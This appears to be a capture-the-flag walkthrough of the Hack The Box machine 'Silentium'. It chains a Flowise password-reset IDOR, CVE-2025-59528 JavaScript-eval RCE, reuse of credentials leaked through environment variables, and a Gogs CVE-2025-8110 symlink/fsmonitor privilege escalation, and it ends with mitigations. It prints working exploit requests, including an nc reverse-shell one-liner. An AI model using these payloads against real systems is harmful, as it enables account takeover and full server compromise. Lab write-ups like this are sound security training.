---
title: "HTB Walkthrough: Silentium"
date: 2026-04-12
draft: false
description: "Full walkthrough of the Silentium machine from Hack The Box. Easy difficulty, Linux Ubuntu 24.04. IDOR on the Flowise password reset endpoint exposes tempToken in the response, CVE-2025-59528 JS eval RCE inside Docker, SSH credential reuse from environment variables, and root escalation via CVE-2025-8110 in Gogs 0.13.0 (symlink + fsmonitor SUID bash)."
tags: ["HackTheBox", "Linux", "Easy", "Flowise", "IDOR", "RCE", "Docker", "Gogs", "Symlink", "SUID", "CVE-2025-59528", "CVE-2025-8110", "PasswordReuse", "PortForwarding", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Silentium** on Hack The Box. **Easy** difficulty machine running **Linux (Ubuntu 24.04 LTS)**. IDOR on the **Flowise** password reset endpoint returns `tempToken` directly in the JSON response — no email delivery needed. **CVE-2025-59528** (JavaScript eval on the `customMCP` endpoint) gives RCE inside a Docker container, where SMTP credentials leak through environment variables and are reused on SSH. Privilege escalation via **CVE-2025-8110** in **Gogs 0.13.0**: symlink traversal overwrites `.git/config`, and the `fsmonitor` directive executes `chmod +s /usr/bin/bash` with root privileges.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                               |
|----------------|----------------------------------------------------------------------------------------------------------------------|
| **Name**       | Silentium                                                                                                            |
| **OS**         | Linux (Ubuntu 24.04 LTS)                                                                                             |
| **Difficulty** | Easy                                                                                                                 |
| **IP**         | 10.129.17.219                                                                                                        |
| **Techniques** | IDOR · CVE-2025-59528 JS eval RCE · Docker env credential leak · SSH password reuse · CVE-2025-8110 Gogs symlink + fsmonitor SUID |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.17.219
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -sC -sV -p22,80 10.129.17.219
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
```

> **💡 Attack surface:** Minimal — only SSH and a web server on nginx. All initial investigation necessarily goes through the web.

---

### 1.2 Web Enumeration

The site is a corporate landing page for a fictitious financial firm. The "Leadership" team section lists three names:

- **Marcus Thorne** — Managing Director
- **Ben** — Head of Financial Systems *(no surname)*
- **Elena Rossi** — Chief Risk Officer

> **💡 Username inference:** Ben is the only team member without a last name, suggesting his login is simply `ben`.

We add `silentium.htb` to `/etc/hosts` and run directory enumeration — nothing actionable at the root. We pivot to virtual host discovery.

---

### 1.3 Virtual Host Fuzzing

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://silentium.htb/ \
     -H "Host: FUZZ.silentium.htb" \
     -fs 178
```

```
staging    [Status: 200, Size: 3142, Duration: 54ms]
```

We add `staging.silentium.htb` to `/etc/hosts`. Visiting it reveals a **Flowise** instance — an open-source platform for building AI agents visually.

> **💡 Key discovery:** Flowise 3.0.5 is affected by CVE-2025-59528 (versions ≥ 2.2.7-patch.1 and < 3.0.6) — but the RCE exploit **requires valid credentials**. We need to authenticate first.

---

## 2. IDOR on Flowise Password Reset

### 2.1 Identifying the Vulnerability

Inspecting the frontend JavaScript we find the "Forgot Password" view:

```
http://staging.silentium.htb/assets/forgotPassword-Dt6O5dqm.js
```

The reset flow calls `/api/v1/account/forgot-password`. The critical flaw: **the response returns `tempToken` directly in the JSON body** instead of delivering it only to the user's email. Anyone who can call this endpoint can reset any account's password.

```
Normal flow:    forgot-password request → token sent to user's email only
Malicious flow: forgot-password request → token returned in JSON response body
                → attacker reads token → resets any account's password directly
```

### 2.2 Exploiting the IDOR

**Step 1 — Request a reset for `ben@silentium.htb`:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "emqTPCpyFjXYJwk15kpm3YBy4SyU1No1ysNewciMHiAfvykO57xZhY0rzBTvEJCW",
    "tokenExpiry": "2026-04-11T21:02:58.455Z",
    "status": "active"
  }
}
```

The token is right there in the response — no email access needed.

**Step 2 — Use the token to set a new password:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "emqTPCpyFjXYJwk15kpm3YBy4SyU1No1ysNewciMHiAfvykO57xZhY0rzBTvEJCW",
      "password": "1234.Abcd"
    }
  }'
```

```json
{"user": {"email": "ben@silentium.htb", "tempToken": "", "status": "active"}}
```

> **🔑 Credentials obtained:** `ben@silentium.htb : 1234.Abcd`

---

## 3. CVE-2025-59528 — Flowise JS RCE

### 3.1 Metasploit

```bash
[msf] >> use exploit/multi/http/flowise_js_rce
[msf] >> set RHOSTS 10.129.17.219
[msf] >> set VHOST staging.silentium.htb
[msf] >> set RPORT 80
[msf] >> set LHOST tun0
[msf] >> set FLOWISE_EMAIL ben@silentium.htb
[msf] >> set FLOWISE_PASSWORD 1234.Abcd
[msf] >> run
```

```
[*] Flowise version detected: 3.0.5
[+] Authentication successful
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.17.219:57642)
```

We have a shell, but **we're inside a Docker container** (confirmed by `/.dockerenv`).

### 3.2 Manual Exploitation — `customMCP` Endpoint

The endpoint `/api/v1/node-load-method/customMCP` accepts an MCP server configuration string and evaluates it as JavaScript on the Node.js server without sanitization.

```
Normal flow:    mcpServerConfig = "valid JS config" → lists available MCP actions
Malicious flow: mcpServerConfig = "({x:(function(){require('child_process').exec(...)})})"
                → arbitrary OS command executed on the server
```

From the browser console while authenticated in Flowise:

```javascript
fetch('/api/v1/node-load-method/customMCP', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'x-request-from': 'internal'
  },
  body: JSON.stringify({
    loadMethod: "listActions",
    inputs: {
      mcpServerConfig: "({x:(function(){const cp = process.mainModule.require('child_process'); cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.237 4444 >/tmp/f'); return 1;})()})"
    }
  })
}).then(res => res.json()).then(console.log);
```

With `nc -lvnp 4444` listening, we get a shell inside the container. Checking environment variables:

```bash
env
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SENDER_EMAIL=ben@silentium.htb
SMTP_PASSWORD=r04D!!_R4ge
SMTP_USERNAME=test
SMTP_HOST=mailhog
SMTP_PORT=1025
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
```

> **💡 Key finding:** Credentials in environment variables — `ben` / `r04D!!_R4ge` (SMTP password) — candidates for password reuse on the host system.

---

## 4. User Flag

```bash
ssh ben@10.129.17.219
# Password: r04D!!_R4ge
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
ben@silentium:~$
```

The SMTP password was reused on the host system.

```bash
ben@silentium:~$ cat user.txt
```

> 🔑 User flag obtained.

---

## 5. Privilege Escalation — CVE-2025-8110 (Gogs Symlink)

### 5.1 Internal Service Discovery

```bash
ben@silentium:~$ netstat -tulpn | grep 127.0.0.1
```

```
tcp  0  0  127.0.0.1:3000   0.0.0.0:*  LISTEN  -   ← Flowise
tcp  0  0  127.0.0.1:3001   0.0.0.0:*  LISTEN  -   ← Gogs
tcp  0  0  127.0.0.1:8025   0.0.0.0:*  LISTEN  -   ← MailHog (UI)
tcp  0  0  127.0.0.1:1025   0.0.0.0:*  LISTEN  -   ← MailHog (SMTP)
```

> **⚠️ Vulnerable service:** Port **3001** runs **Gogs 0.13.0**, vulnerable to **CVE-2025-8110**. It allows overwriting arbitrary server files through a malicious symlink uploaded to a Git repository — and only accessible from localhost.

### 5.2 Port Forwarding

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.17.219
```

We access `http://127.0.0.1:3001` and register user `tester`.

### 5.3 How CVE-2025-8110 Works

Gogs does not properly validate symlinks inside Git repositories. By uploading a symlink pointing to `.git/config` and then using the Gogs API to write content through that symlink, we overwrite the repository's real `.git/config` on the server. When Gogs processes a subsequent push, Git reads the modified config and executes the command specified in the `fsmonitor` directive.

```
Normal flow:    push → Gogs stores files → Git config untouched
Malicious flow: push symlink (→ .git/config) → API write through symlink
                → overwrites server-side .git/config with fsmonitor payload
                → next push → Git executes fsmonitor command as Gogs process (root)
```

### 5.4 Setting Up the Repository with the Symlink

```bash
ben@silentium:/tmp$ mkdir pwn_local && cd pwn_local
ben@silentium:/tmp/pwn_local$ git init
ben@silentium:/tmp/pwn_local$ ln -s .git/config evil_link
ben@silentium:/tmp/pwn_local$ git add evil_link
ben@silentium:/tmp/pwn_local$ git commit -m "Add symlink"
```

Create an empty `pwn` repository in Gogs via the web UI, then push:

```bash
ben@silentium:/tmp/pwn_local$ git remote add origin http://127.0.0.1:3001/tester/pwn.git
ben@silentium:/tmp/pwn_local$ git push origin master
```

### 5.5 Writing the Malicious Config via the API

The `fsmonitor` directive in `.git/config` specifies a command Git runs when processing the repository. We use it to set the SUID bit on `/usr/bin/bash`:

```bash
cat << EOF > exploit_config
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
    fsmonitor = "chmod +s /usr/bin/bash"
EOF

PAYLOAD=$(base64 -w 0 < exploit_config)

curl -X PUT "http://127.0.0.1:3001/api/v1/repos/tester/pwn/contents/evil_link" \
  -H "Authorization: token 36a4fbd1b1d0343a8cf4a7efb41a6314a0662489" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"pwn\", \"content\":\"$PAYLOAD\"}"
```

### 5.6 Triggering `fsmonitor` and Getting Root

```bash
ben@silentium:/tmp/pwn_local$ git commit --allow-empty -m "trigger"
ben@silentium:/tmp/pwn_local$ git push origin master
```

When Gogs processes the push, Git reads the modified config and executes `chmod +s /usr/bin/bash` with Gogs process privileges (root).

```bash
ben@silentium:/tmp/pwn_local$ ls -l /usr/bin/bash
-rwsrwsrwx 1 root root 1446024 Mar 31 2024 /usr/bin/bash

ben@silentium:/tmp/pwn_local$ bash -p
```

> **💡 Key detail:** The `-p` flag activates bash's "privileged" mode, which prevents it from dropping the EUID at startup. Without it, bash would ignore the SUID bit as a modern security measure.

```
bash-5.2# id
uid=1000(ben) gid=1000(ben) euid=0(root) egid=0(root) groups=0(root)
```

---

## 6. Root Flag

```bash
bash-5.2# cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 7. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Port 80 (nginx) + port 22. Virtual host fuzzing reveals `staging.silentium.htb` running Flowise 3.0.5.
2. **IDOR** → `/api/v1/account/forgot-password` returns `tempToken` in the response body → password reset for `ben@silentium.htb`.
3. **CVE-2025-59528** → JS eval via `/api/v1/node-load-method/customMCP` → RCE inside Docker container.
4. **Credential leak** → `env` shows `SMTP_PASSWORD=r04D!!_R4ge`.
5. **SSH foothold** → Password reuse: `ben:r04D!!_R4ge` → `user.txt`.
6. **CVE-2025-8110** → Gogs 0.13.0 on port 3001 (localhost) → symlink + API write overwrites `.git/config` → `fsmonitor` executes `chmod +s /usr/bin/bash` as root → `bash -p` → `root.txt`.

**What I learned from this machine:**

- **IDOR on authentication flows is disproportionately impactful.** Returning `tempToken` in the response body isn't just a logic bug — it effectively removes authentication from password reset entirely. The fix is trivial: return only a success status, never the token itself.

- **CVE-2025-59528 is a perfect example of unsafe `eval` in a trusted context.** The `customMCP` endpoint was designed for internal use, but without input sanitization any authenticated user becomes root on the Node.js process. "Internal use" is not a security boundary when the feature is exposed on a network-accessible port.

- **Credentials in environment variables are readable by anyone with process-level access.** Docker's environment variable injection is convenient, but leaks everything to anyone who runs `env` inside the container. Secret managers (Vault, AWS Secrets Manager, Docker secrets) exist precisely to avoid this.

- **Password reuse between services on the same host is a force multiplier.** A Docker container's SMTP password became SSH access to the host. One credential, two services, full foothold.

- **Symlink vulnerabilities in Git hosting platforms are subtle but severe.** CVE-2025-8110 requires understanding Git's internals — how `.git/config` controls hook and filter execution — to appreciate why an overwrite is RCE. The `fsmonitor` directive is not commonly audited even though it runs arbitrary commands on every Git operation.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| IDOR on password reset (`tempToken` in response) | Never return the token in the API response; send it **only** via email |
| CVE-2025-59528 — JS eval on `customMCP` | Upgrade Flowise to ≥ 3.0.6; never eval user-controlled input as code |
| Credentials in Docker environment variables | Use secret managers (Vault, AWS Secrets Manager, Docker secrets) |
| SSH/SMTP password reuse | Unique credential per service; enforce with a password manager |
| CVE-2025-8110 — Gogs symlink + `fsmonitor` | Update Gogs to a patched version; never run the service as root |
| `fsmonitor` unrestricted execution | Configure `safe.directory`; disable `fsmonitor` in server-side Git configurations |
